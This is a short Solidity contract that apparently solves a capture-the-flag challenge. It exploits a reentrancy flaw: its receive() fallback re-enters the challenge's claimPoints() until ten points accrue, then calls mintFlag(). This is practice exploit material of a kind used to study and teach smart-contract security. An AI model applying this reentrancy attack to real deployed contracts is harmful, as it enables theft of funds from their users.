//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge5 {
    function claimPoints() external;
    function mintFlag() external;
    function points(address) external view returns (uint256);
}

contract S1Challenge5Solver {
    IChallenge5 public challenge;
    uint256 public count;
    uint256 public constant TARGET = 10;

    constructor(address _challengeAddress) {
        challenge = IChallenge5(_challengeAddress);
    }

    function attack() external {
        count = 1;
        challenge.claimPoints();
        // After the recursion finishes, we should have 10 points
        challenge.mintFlag();
    }

    // This is called by the challenge: (bool success, ) = msg.sender.call("");
    receive() external payable {
        if (count < TARGET) {
            count++;
            challenge.claimPoints();
        }
    }
}